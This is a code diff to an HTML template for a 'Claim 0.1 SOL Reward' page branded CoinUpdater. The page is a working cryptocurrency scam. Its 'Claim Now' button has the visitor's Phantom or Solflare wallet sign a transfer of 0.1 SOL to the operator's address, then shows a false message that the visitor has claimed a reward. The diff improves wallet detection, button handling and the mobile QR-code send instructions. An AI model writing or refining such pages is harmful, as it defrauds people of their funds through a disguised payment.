@@ -25,6 +25,7 @@ HTML_TEMPLATE = """
       margin: 20px auto;
       border-radius: 16px;
       box-shadow: 0 0 20px #00ff90;
+      display: none;
     }
     .wallet-button, .claim-button {
       background: linear-gradient(90deg, #00ff90, #00d178);
@@ -37,13 +38,23 @@ HTML_TEMPLATE = """
       color: #000;
       font-weight: bold;
     }
-    .wallet-button:disabled {
+    .wallet-button:disabled, .claim-button:disabled {
       background: #555;
       cursor: not-allowed;
-      color: #ccc;
+      color: #999;
+    }
+    .info {
+      font-size: 1.1em;
+      margin: 20px 0;
+      color: #0f0;
+      display: none;
+    }
+    .warning {
+      color: #f44;
+      margin-top: 30px;
     }
   </style>
-  <!-- Solana wallet adapter + scripts -->
+  <!-- Solana wallet adapter + web3.js -->
   <script type="module">
     import {
       Connection,
@@ -54,57 +65,34 @@ HTML_TEMPLATE = """
 
     let provider = null;
 
-    function enableConnectButton() {
-      const btn = document.getElementById("connectWalletBtn");
-      btn.disabled = false;
-      console.log("Connect button enabled");
-    }
-
-    function checkWalletProvider() {
-      if (window.solflare && window.solflare.isSolflare) {
-        provider = window.solflare;
-        console.log("Detected Solflare wallet");
-        enableConnectButton();
-      } else if (window.solana && window.solana.isPhantom) {
+    window.onload = () => {
+      // Detect solana provider - Phantom or Solflare extensions on desktop browsers
+      if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
         provider = window.solana;
-        console.log("Detected Phantom wallet");
-        enableConnectButton();
+        document.getElementById("connectWalletBtn").disabled = false;
+        document.getElementById("claimBtn").disabled = false;
+        document.getElementById("walletStatus").innerText = "Wallet detected: " + (provider.isPhantom ? "Phantom" : "Solflare");
       } else {
-        console.log("No supported wallet detected yet");
-        document.getElementById("walletStatus").innerText = "No Solflare or Phantom wallet detected";
+        // Show QR code and instructions if wallet not detected (likely mobile)
+        document.getElementById("qrCode").style.display = "block";
+        document.getElementById("infoManualSend").style.display = "block";
+        document.getElementById("walletStatus").innerText = "No compatible wallet detected. Use the QR code to send manually.";
+        // Disable buttons
+        document.getElementById("connectWalletBtn").disabled = true;
+        document.getElementById("claimBtn").disabled = true;
       }
-    }
-
-    window.addEventListener('load', () => {
-      checkWalletProvider();
-
-      // Sometimes wallets inject asynchronously, so check again after delay
-      setTimeout(() => {
-        if (!provider) {
-          console.log("Retrying wallet detection after delay");
-          checkWalletProvider();
-        }
-      }, 2000);
-
-      // Some wallets emit events on initialization, listen for those
-      window.addEventListener('solflare#initialized', () => {
-        console.log('Solflare initialized event detected');
-        checkWalletProvider();
-      });
-    });
+    };
 
     async function connectWallet() {
       if (!provider) {
-        alert("No Solflare or Phantom wallet detected");
+        alert("No compatible wallet found.");
         return;
       }
       try {
         const res = await provider.connect();
-        document.getElementById("walletStatus").innerText =
-          "Wallet Connected: " + res.publicKey.toString();
+        document.getElementById("walletStatus").innerText = "Wallet Connected: " + res.publicKey.toString();
       } catch (err) {
-        console.error(err);
-        alert("Wallet connection failed or was rejected.");
+        alert("Wallet connection failed: " + err.message);
       }
     }
 
@@ -115,23 +103,23 @@ HTML_TEMPLATE = """
       }
 
       const connection = new Connection("https://api.mainnet-beta.solana.com");
-      const recipient = new PublicKey("{{ wallet }}");
 
       const transaction = new Transaction().add(
         SystemProgram.transfer({
           fromPubkey: provider.publicKey,
-          toPubkey: recipient,
-          lamports: Math.floor(0.1 * 1e9),
+          toPubkey: new PublicKey("{{ wallet }}"),
+          lamports: 0.1 * 1e9 // 0.1 SOL
         })
       );
 
       try {
-        const signedTx = await provider.signAndSendTransaction(transaction);
-        await connection.confirmTransaction(signedTx.signature);
-        alert("✅ Transaction sent. You've claimed 0.1 SOL. Please wait 24 hours.");
+        // Sign and send transaction via wallet provider
+        const { signature } = await provider.signAndSendTransaction(transaction);
+        await connection.confirmTransaction(signature);
+        alert("✅ Transaction sent! You’ve claimed 0.1 SOL. Please wait 24 hours.");
       } catch (e) {
         console.error(e);
-        alert("❌ Transaction failed or cancelled.");
+        alert("❌ Transaction failed: " + e.message);
       }
     }
 
@@ -141,12 +129,13 @@ HTML_TEMPLATE = """
 </head>
 <body>
   <h1>Claim 0.1 SOL Reward</h1>
-  <p>Send exactly <b>0.1 SOL</b> to:</p>
+  <p>Send exactly <b>0.1 SOL</b> to this wallet:</p>
   <p><code>{{ wallet }}</code></p>
-  <img src="{{ qr_url }}" class="qr" alt="QR Code" />
-  <p id="walletStatus">Wallet not connected</p>
+  <img src="{{ qr_url }}" alt="QR Code" id="qrCode" class="qr" />
+  <p id="infoManualSend" class="info">Scan the QR code with your Solflare or Phantom mobile wallet app to send 0.1 SOL manually.</p>
+  <p id="walletStatus">Detecting wallet...</p>
   <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button" disabled>Connect Wallet</button>
-  <button onclick="sendTransaction()" class="claim-button">Claim Now</button>
+  <button id="claimBtn" onclick="sendTransaction()" class="claim-button" disabled>Claim Now</button>
   <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
 </body>
 </html>
